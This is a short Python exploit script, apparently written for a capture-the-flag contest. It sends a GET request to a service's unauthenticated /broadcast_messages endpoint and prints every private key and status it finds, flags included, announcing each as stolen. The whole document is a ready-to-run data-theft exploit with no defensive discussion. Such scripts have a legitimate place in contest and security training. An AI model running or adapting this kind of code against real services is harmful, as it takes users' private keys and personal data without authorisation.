### Simply request /broadcast_messages and receive tons of user data, including
### flags in statuses, for example.

import requests

def exploit(target):
    r = requests.get(f'{target}/broadcast_messages')
    if r.status_code != 200:
        print('Something wrong with target server')
        return
    try:
        obj = r.json()
    except ValueError:
        print('Something wrong with target server')
        return
    if 'ok' not in obj:
        print('Something wrong with target server')
        return
    for message in obj['ok']:
        if 'priv_key' in message:
            print(f'Stole a private key! {message["priv_key"]}')
        if 'status' in message:
            print(f'Stole a status! {message["status"]}')

TARGET = 'http://localhost:7777' # for example
exploit(TARGET)
